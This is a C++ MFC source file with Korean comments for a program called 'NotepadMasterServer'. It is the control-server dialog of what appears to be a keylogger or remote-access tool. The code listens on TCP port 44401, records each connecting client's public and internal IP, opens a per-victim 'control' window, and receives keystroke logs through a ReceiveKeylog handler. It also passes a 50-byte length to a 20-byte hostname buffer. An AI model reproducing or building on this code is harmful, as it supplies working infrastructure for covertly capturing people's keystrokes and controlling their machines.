
// NotepadMasterServerDlg.cpp: 구현 파일
//

#include "pch.h"
#include "framework.h"
#include "NotepadMasterServer.h"
#include "NotepadMasterServerDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 응용 프로그램 정보에 사용되는 CAboutDlg 대화 상자입니다.

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 대화 상자 데이터입니다.
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 지원입니다.

// 구현입니다.
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CNotepadMasterServerDlg 대화 상자



CNotepadMasterServerDlg::CNotepadMasterServerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_NOTEPADMASTERSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNotepadMasterServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_CLIENTS, m_list_clients);
}

BEGIN_MESSAGE_MAP(CNotepadMasterServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_CLIENTS, &CNotepadMasterServerDlg::OnDblclkListClients)
END_MESSAGE_MAP()


// CNotepadMasterServerDlg 메시지 처리기

BOOL CNotepadMasterServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 시스템 메뉴에 "정보..." 메뉴 항목을 추가합니다.

	// IDM_ABOUTBOX는 시스템 명령 범위에 있어야 합니다.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 이 대화 상자의 아이콘을 설정합니다.  응용 프로그램의 주 창이 대화 상자가 아닐 경우에는
	//  프레임워크가 이 작업을 자동으로 수행합니다.
	SetIcon(m_hIcon, TRUE);			// 큰 아이콘을 설정합니다.
	SetIcon(m_hIcon, FALSE);		// 작은 아이콘을 설정합니다.

	// TODO: 여기에 추가 초기화 작업을 추가합니다.
	m_listen_socket = new CListenSocket(this);
	if (!m_listen_socket->Create(44401)) {
		MessageBox(TEXT("Creating socket error"), TEXT("error"), MB_OK | MB_ICONERROR);
		return FALSE;
	}
	else {
		if (!m_listen_socket->Listen()) {
			MessageBox(TEXT("Listen socket error"), TEXT("error"), MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}
	CRect rect;
	m_list_clients.GetClientRect(&rect);
	m_list_clients.InsertColumn(0, TEXT("no"), LVCFMT_LEFT, 50);
	m_list_clients.InsertColumn(1, TEXT("IP"), LVCFMT_LEFT, 150);
	m_list_clients.InsertColumn(2, TEXT("Internal IP"), LVCFMT_LEFT, 150);

	char hostname[20] = "";
	if (gethostname(hostname, 50) == 0)
		strcpy_s(hostname, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));

	char buff[100] = "";
	sprintf_s(buff, "현재 호스트 : %s", hostname);
	CString outbuff;
	outbuff = buff;
	GetDlgItem(IDC_STATIC_HOST)->SetWindowTextW(outbuff);

	return TRUE;  // 포커스를 컨트롤에 설정하지 않으면 TRUE를 반환합니다.
}

void CNotepadMasterServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 대화 상자에 최소화 단추를 추가할 경우 아이콘을 그리려면
//  아래 코드가 필요합니다.  문서/뷰 모델을 사용하는 MFC 응용 프로그램의 경우에는
//  프레임워크에서 이 작업을 자동으로 수행합니다.

void CNotepadMasterServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 그리기를 위한 디바이스 컨텍스트입니다.

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 클라이언트 사각형에서 아이콘을 가운데에 맞춥니다.
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 아이콘을 그립니다.
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// 사용자가 최소화된 창을 끄는 동안에 커서가 표시되도록 시스템에서
//  이 함수를 호출합니다.
HCURSOR CNotepadMasterServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CNotepadMasterServerDlg::ClientAccept()
{
	// TODO: 여기에 구현 코드 추가.
	CClientSocket* newsocket = new CClientSocket(this);
	CClient* newview = new CClient;

	if (!m_listen_socket->Accept(*newsocket))
	{
		MessageBox(L"accept failed", L"error", MB_OK | MB_ICONERROR);
		delete newsocket;
		return;
	}
	CString IP;
	UINT port = 0;

	newsocket->GetPeerName(IP, port);

	CString temp;
	UINT index = m_list_clients.GetItemCount();
	temp.Format(L"%d", m_list_clients.GetItemCount() + 1);
	m_list_clients.InsertItem(index, temp , 0);
	m_list_clients.SetItemText(index, 1, IP);
	m_list_clients.SetItemText(index, 2, L"Internal IP");

	m_client_list.push_back(newview);
	m_client_list[index]->socket = newsocket;
}

/* 클라이언트 조종 화면을 띄워줌 */
void CNotepadMasterServerDlg::OnDblclkListClients(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	if (pNMItemActivate->iItem < 0) // 선택을 올바르게 하지 않았으면
		return;

	CString format;
	format.Format(L"User#%d", pNMItemActivate->iItem + 1);

	if (!m_client_list[pNMItemActivate->iItem]->m_hWnd)
	{
		m_client_list[pNMItemActivate->iItem]->Create(IDD_DIALOG_CLIENT, AfxGetMainWnd());
		m_client_list[pNMItemActivate->iItem]->SetWindowTextW(format);
		m_client_list[pNMItemActivate->iItem]->ShowWindow(SW_SHOW);
	}
	*pResult = 0;
}

/* 접속 때 설정해주지 못한 값(내부망 IP 등)을 설정해줌 */
void CNotepadMasterServerDlg::SetInvisibleInfo(CClientSocket* pObj, CString internal_ip)
{
	// TODO: 여기에 구현 코드 추가.
	UINT index = 0;
	for (index = 0; m_client_list[index]->socket != pObj; index++); // 요청이 들어온 소켓이 포함된 유저 페이지의 인덱스를 구함
	m_list_clients.SetItemText(index, 2, internal_ip);
}


void CNotepadMasterServerDlg::ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu)
{
	// TODO: 여기에 구현 코드 추가.
	UINT index = 0;
	for (index = 0; m_client_list[index]->socket != pObj; index++); // 요청이 들어온 소켓이 포함된 유저 페이지의 인덱스를 구함

	m_client_list[index]->ReceiveKeylog(pdu);
	return;
}
